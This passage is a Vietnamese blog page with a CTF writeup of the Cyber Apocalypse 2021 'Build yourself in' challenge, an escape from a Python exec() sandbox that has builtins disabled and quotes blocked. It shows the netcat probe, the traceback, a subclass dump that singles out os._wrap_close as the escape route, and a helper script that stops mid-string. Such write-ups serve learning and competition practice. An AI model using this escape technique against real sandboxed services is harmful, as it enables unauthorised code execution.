@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.79.1 with theme Tranquilpeak 0.4.8-BETA">
+<meta name="author" content="Manh NV">
+<meta name="keywords" content=", development, cyber security">
+<meta name="description" content="Đề bài Cũng như mấy bài misc khác, bài này cũng chỉ cho 1 ip và port để có thể connect vào.
+Khi tôi connect vào và điền một vài thứ ngớ ngẩn vào để thăm dò cách hoạt động của server, thì tôi nhận được một thông báo lỗi như sau:
+Đúng vậy, đó là một chương trình chạy bằng python gồm một số thống tin như sau:
+ File python: /app/build_yourself_in.">
+
+
+<meta property="og:description" content="Đề bài Cũng như mấy bài misc khác, bài này cũng chỉ cho 1 ip và port để có thể connect vào.
+Khi tôi connect vào và điền một vài thứ ngớ ngẩn vào để thăm dò cách hoạt động của server, thì tôi nhận được một thông báo lỗi như sau:
+Đúng vậy, đó là một chương trình chạy bằng python gồm một số thống tin như sau:
+ File python: /app/build_yourself_in.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Cyber Apocalypse 2021]- Misc &#39;Build yourself in&#39; writeup">
+<meta name="twitter:title" content="[Cyber Apocalypse 2021]- Misc &#39;Build yourself in&#39; writeup">
+<meta property="og:url" content="https://manhnv.com/2021/04/cyber-apocalypse-2021-misc-build-yourself-in-writeup/">
+<meta property="twitter:url" content="https://manhnv.com/2021/04/cyber-apocalypse-2021-misc-build-yourself-in-writeup/">
+<meta property="og:site_name" content="Chia sẻ là niềm vui">
+<meta property="og:description" content="Đề bài Cũng như mấy bài misc khác, bài này cũng chỉ cho 1 ip và port để có thể connect vào.
+Khi tôi connect vào và điền một vài thứ ngớ ngẩn vào để thăm dò cách hoạt động của server, thì tôi nhận được một thông báo lỗi như sau:
+Đúng vậy, đó là một chương trình chạy bằng python gồm một số thống tin như sau:
+ File python: /app/build_yourself_in.">
+<meta name="twitter:description" content="Đề bài Cũng như mấy bài misc khác, bài này cũng chỉ cho 1 ip và port để có thể connect vào.
+Khi tôi connect vào và điền một vài thứ ngớ ngẩn vào để thăm dò cách hoạt động của server, thì tôi nhận được một thông báo lỗi như sau:
+Đúng vậy, đó là một chương trình chạy bằng python gồm một số thống tin như sau:
+ File python: /app/build_yourself_in.">
+<meta property="og:locale" content="vi">
+
+  
+    <meta property="article:published_time" content="2021-04-25T00:00:00">
+  
+  
+    <meta property="article:modified_time" content="2021-04-25T00:00:00">
+  
+  
+  
+    
+      <meta property="article:section" content="ctf">
+    
+  
+  
+    
+      <meta property="article:tag" content="ctf">
+    
+      <meta property="article:tag" content="Cyber Apocalypse 2021">
+    
+      <meta property="article:tag" content="ctf misc writeup">
+    
+      <meta property="article:tag" content="writeup">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.20.38.png">
+  <meta property="twitter:image" content="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.20.38.png">
+
+
+
+
+
+  <meta property="og:image" content="https://manhnv.com/favicon.png">
+  <meta property="twitter:image" content="https://manhnv.com/favicon.png">
+
+
+    <title>[Cyber Apocalypse 2021]- Misc &#39;Build yourself in&#39; writeup</title>
+
+    <link rel="icon" href="https://manhnv.com/favicon.png">
+    
+
+    
+
+    <link rel="canonical" href="https://manhnv.com/2021/04/cyber-apocalypse-2021-misc-build-yourself-in-writeup/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://manhnv.com/css/style-twzjdbqhmnnacqs0pwwdzcdbt8yhv8giawvjqjmyfoqnvazl0dalmnhdkvp7.min.css" />
+    
+    
+
+    
+      
+    
+    <meta property="fb:pages" content="447047472469512" />
+
+<div id="fb-root"></div>
+<script>
+  window.fbAsyncInit = function() {
+    FB.init({
+      xfbml            : true,
+      version          : 'v9.0'
+    });
+  };
+
+  (function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = 'https://connect.facebook.net/en_US/sdk/xfbml.customerchat.js';
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+<div class="fb-customerchat"
+  attribution="setup_tool"
+  page_id="447047472469512"
+theme_color="#20cef5"
+logged_in_greeting="Hi! How can I help you?"
+logged_out_greeting="Hi! How can I help you?">
+</div>
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="5">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://manhnv.com/">Chia sẻ là niềm vui</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://manhnv.com/#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://manhnv.com/favicon.png" alt="Ảnh đại diện" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="5">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://manhnv.com/#about">
+          <img class="sidebar-profile-picture" src="https://manhnv.com/favicon.png" alt="Ảnh đại diện" />
+        </a>
+        <h4 class="sidebar-profile-name">Manh NV</h4>
+        
+          <h5 class="sidebar-profile-bio">Chia sẻ là niềm vui</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/donate.html">
+    
+      <i class="sidebar-button-icon fa fa-usd"></i>
+      
+      <span class="sidebar-button-desc">Donate</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">Trang chủ</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">Danh mục</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">Thẻ thông tin</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">Lưu trữ</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">Thông tin</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/copyrights">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-copyright"></i>
+      
+      <span class="sidebar-button-desc">Copyrights</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/nguyenmanh1997" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://facebook.com/manhnv.sec" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-facebook"></i>
+      
+      <span class="sidebar-button-desc">Facebook</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.youtube.com/channel/UCEY3DBfSDupbSG96jfcSDwQ?sub_confirmation=1" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-youtube"></i>
+      
+      <span class="sidebar-button-desc">Youtube</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="5"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title" itemprop="headline">
+      [Cyber Apocalypse 2021]- Misc &#39;Build yourself in&#39; writeup
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2021-04-25T00:00:00Z">
+        
+  tháng 4 25, 2021
+
+      </time>
+    
+    
+  
+  
+    <span>mục</span>
+    
+      <a class="category-link" href="https://manhnv.com/categories/ctf">ctf</a>
+    
+  
+
+  </div>
+
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <h1 id="đề-bài">Đề bài</h1>
+<p>Cũng như mấy bài misc khác, bài này cũng chỉ cho 1 ip và port để có thể connect vào.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.20.38.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.20.38.png"></p>
+<p>Khi tôi connect vào và điền một vài thứ ngớ ngẩn vào để thăm dò cách hoạt động của server, thì tôi nhận được một thông báo lỗi như sau:</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.21.56.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.21.56.png"></p>
+<p>Đúng vậy, đó là một chương trình chạy bằng python gồm một số thống tin như sau:</p>
+<ul>
+<li>File python: /app/build_yourself_in.py</li>
+<li>Có sử dụng exec: exec(text, {'<strong>builtins</strong>': None, &lsquo;print&rsquo;:print})</li>
+<li>Dòng lỗi <code>TypeError: 'NoneType' object is not subscriptable</code>: Có thể đoán là dữ liệu nhập vào, sẽ được chuyển vào <code>exec</code> để chạy.</li>
+</ul>
+<p>Và dưới dây là thông tin đó.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>  ~<span style="color:#f92672">]</span>$ nc 206.189.121.131 <span style="color:#ae81ff">30736</span>
+3.8.9 <span style="color:#f92672">(</span>default, Apr <span style="color:#ae81ff">15</span> 2021, 05:07:04<span style="color:#f92672">)</span> 
+<span style="color:#f92672">[</span>GCC 10.2.1 20201203<span style="color:#f92672">]</span>
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Only 👽 are allowed!
+
+&gt;&gt;&gt; asdfsdfdsf
+Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
+  File <span style="color:#e6db74">&#34;/app/build_yourself_in.py&#34;</span>, line 16, in &lt;module&gt;
+    main<span style="color:#f92672">()</span>
+  File <span style="color:#e6db74">&#34;/app/build_yourself_in.py&#34;</span>, line 13, in main
+    exec<span style="color:#f92672">(</span>text, <span style="color:#f92672">{</span><span style="color:#e6db74">&#39;__builtins__&#39;</span>: None, <span style="color:#e6db74">&#39;print&#39;</span>:print<span style="color:#f92672">})</span>
+  File <span style="color:#e6db74">&#34;&lt;string&gt;&#34;</span>, line 1, in &lt;module&gt;
+TypeError: <span style="color:#e6db74">&#39;NoneType&#39;</span> object is not subscriptable
+<span style="color:#f92672">[</span>  ~<span style="color:#f92672">]</span>$
+</code></pre></div><p>Đây là một bài <code>code injection</code> và ban đầu chưa để ý lắm, tôi đã thử payload như bên dưới.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.23.37.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.23.37.png"></p>
+<p>Và tôi đã nhận về được lỗi: <code>No quotes are allowed!</code>. Vậy là chương trình đã chặn các dấu quotes như: <code>'</code> và <code>&quot;</code>
+Vậy thì tôi thử dùng payload khác không có quotes, vì quotes là để dùng cho object <code>String</code> trong python, nên tôi thử sử dụng object tupe để không sử dụng quotes.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.25.08.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.25.08.png"></p>
+<p>Nhưng sau khi thử xong, chương trình đã không còn trả về lỗi <code>No quotes are allowed!</code> nữa, nhưng mà cũng chả trả về gì cả. Đến đây thì tôi đã nhìn lại phần lỗi ban đầu, và để ý hàm <code>exec(text, {'__builtins__': None, 'print':print})</code>. Với hàm exec này đại khái là phần giá trị của biến <code>text</code> sẽ chỉ có thể chạy được hàm <code>print</code> mà thôi, còn các hàm <code>__builtins__</code> đã bị disable.</p>
+<p>Thực ra thì đối với payload tôi thử từ nãy giờ, cũng chả cần quan tâm <code>'__builtins__': None</code> làm gì, bởi vì nó cũng không sử dụng các hàm <code>__builtins__</code>, mà đang sử dụng object <code>tupe</code>, nhưng phần <code>'print':print</code> thì lại có ích, tôi đã thử thêm <code>print</code> trước payload và nhận được kết quả như sau.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.24.35.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.24.35.png"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>&lt;class <span style="color:#e6db74">&#39;type&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;weakref&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;weakcallableproxy&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;weakproxy&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;int&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;bytearray&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;bytes&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;list&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;NoneType&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;NotImplementedType&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;traceback&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;super&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;range&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;dict&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;dict_keys&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;dict_values&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;dict_items&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;dict_reversekeyiterator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;dict_reversevalueiterator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;dict_reverseitemiterator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;odict_iterator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;set&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;str&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;slice&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;staticmethod&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;complex&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;float&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;frozenset&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;property&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;managedbuffer&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;memoryview&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;tuple&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;enumerate&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;reversed&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;stderrprinter&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;code&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;frame&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;builtin_function_or_method&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;method&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;function&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;mappingproxy&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;generator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;getset_descriptor&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;wrapper_descriptor&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;method-wrapper&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;ellipsis&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;member_descriptor&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;types.SimpleNamespace&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;PyCapsule&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;longrange_iterator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;cell&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;instancemethod&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;classmethod_descriptor&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;method_descriptor&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;callable_iterator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;iterator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;pickle.PickleBuffer&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;coroutine&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;coroutine_wrapper&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;InterpreterID&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;EncodingMap&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;fieldnameiterator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;formatteriterator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;BaseException&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;hamt&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;hamt_array_node&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;hamt_bitmap_node&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;hamt_collision_node&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;keys&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;values&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;items&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;Context&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;ContextVar&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;Token&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;Token.MISSING&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;moduledef&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;module&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;filter&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;map&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;zip&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_frozen_importlib._ModuleLock&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_frozen_importlib._DummyModuleLock&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_frozen_importlib._ModuleLockManager&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_frozen_importlib.ModuleSpec&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_frozen_importlib.BuiltinImporter&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;classmethod&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_frozen_importlib.FrozenImporter&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_frozen_importlib._ImportLockContext&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_thread._localdummy&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_thread._local&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_thread.lock&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_thread.RLock&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_frozen_importlib_external.WindowsRegistryFinder&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_frozen_importlib_external._LoaderBasics&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_frozen_importlib_external.FileLoader&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_frozen_importlib_external._NamespacePath&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_frozen_importlib_external._NamespaceLoader&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_frozen_importlib_external.PathFinder&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_frozen_importlib_external.FileFinder&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_io._IOBase&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_io._BytesIOBuffer&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_io.IncrementalNewlineDecoder&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;posix.ScandirIterator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;posix.DirEntry&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;zipimport.zipimporter&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;zipimport._ZipImportResourceReader&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;codecs.Codec&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;codecs.IncrementalEncoder&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;codecs.IncrementalDecoder&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;codecs.StreamReaderWriter&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;codecs.StreamRecoder&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_abc_data&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;abc.ABC&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;dict_itemiterator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;collections.abc.Hashable&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;collections.abc.Awaitable&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;collections.abc.AsyncIterable&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;async_generator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;collections.abc.Iterable&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;bytes_iterator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;bytearray_iterator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;dict_keyiterator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;dict_valueiterator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;list_iterator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;list_reverseiterator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;range_iterator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;set_iterator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;str_iterator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;tuple_iterator&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;collections.abc.Sized&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;collections.abc.Container&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;collections.abc.Callable&#39;</span>&gt;, ***&lt;class <span style="color:#e6db74">&#39;os._wrap_close&#39;</span>&gt;***, &lt;class <span style="color:#e6db74">&#39;_sitebuiltins.Quitter&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_sitebuiltins._Printer&#39;</span>&gt;, &lt;class <span style="color:#e6db74">&#39;_sitebuiltins._Helper&#39;</span>&gt;<span style="color:#f92672">]</span>
+</code></pre></div><p>Đến đây thì hi vọng về code injection đã có, đối với dữ liệu trên, tôi đã viết 1 đoạn code để đếm và tìm ra class có tên là <code>_wrap_close</code> (class này hoạt động như nào thì các bạn google nha, bài hơi dài không giải thích được hết).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;[&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;dict_reversekeyiterator&#39;&gt;, &lt;class &#39;dict_reversevalueiterator&#39;&gt;, &lt;class &#39;dict_reverseitemiterator&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;wrapper_descriptor&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;pickle.PickleBuffer&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;coroutine_wrapper&#39;&gt;, &lt;class &#39;InterpreterID&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;hamt&#39;&gt;, &lt;class &#39;hamt_array_node&#39;&gt;, &lt;class &#39;hamt_bitmap_node&#39;&gt;, &lt;class &#39;hamt_collision_node&#39;&gt;, &lt;class &#39;keys&#39;&gt;, &lt;class &#39;values&#39;&gt;, &lt;class &#39;items&#39;&gt;, &lt;class &#39;Context&#39;&gt;, &lt;class &#39;ContextVar&#39;&gt;, &lt;class &#39;Token&#39;&gt;, &lt;class &#39;Token.MISSING&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class 